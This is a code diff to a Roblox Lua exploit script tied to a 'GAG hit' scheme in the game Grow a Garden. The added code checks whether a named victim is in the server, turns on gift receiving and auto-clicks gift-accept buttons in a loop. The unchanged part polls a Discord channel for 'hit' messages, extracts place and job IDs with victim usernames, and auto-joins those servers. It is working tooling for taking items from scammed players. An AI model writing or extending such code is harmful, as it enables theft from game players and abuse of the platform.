@@ -68,7 +68,30 @@ local function setReceiveGifts(value)
     game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("SettingsService"):FireServer(unpack(args))
 end
 
-setReceiveGifts(true)
+local victimInGame = false
+for _, p in ipairs(game.Players:GetPlayers()) do
+    if p.Name == victimUser then
+        victimInGame = true
+        break
+    end
+end
+
+setReceiveGifts(victimInGame)
+
+local giftNoti = plr:WaitForChild("PlayerGui"):WaitForChild("Gift_Notification"):WaitForChild("Frame")
+
+local function acceptGifts()
+    while task.wait(0.1) do
+        for _, v in pairs(giftNoti:GetChildren()) do
+            if v:IsA("ImageLabel") then
+                local acceptImageButton = v:WaitForChild("Holder"):WaitForChild("Frame"):WaitForChild("Accept")
+                replicatesignal(acceptImageButton.MouseButton1Click)
+            end
+        end
+    end
+end
+
+task.spawn(acceptGifts)
 
 wait(0.5)
 game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('hi')
@@ -107,17 +130,13 @@ local function autoJoin()
 
     if response.StatusCode == 200 then
         local messages = HttpServ:JSONDecode(response.Body)
-        if #messages == 0 then
-            print("0 messages found")
-            return
-        end
+        if #messages == 0 then return end
         for _, message in ipairs(messages) do
             if message.content ~= "" and message.embeds and message.embeds[1] and message.embeds[1].title then
                 if message.embeds[1].title:find("Join to get GAG hit") then
                     local placeId, jobId = string.match(message.content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)')
                     if placeId and jobId then
                         local victimUsername = message.embeds[1].fields[1].value
-
                         if didVictimLeave or timer > 10 then
                             if not table.find(joinedIds, tostring(message.id)) then
                                 saveJoinedId(tostring(message.id))
@@ -130,8 +149,6 @@ local function autoJoin()
                 end
             end
         end
-    else
-        print("Response code is not 200. Is your token and channelid correct?")
     end
 end
 
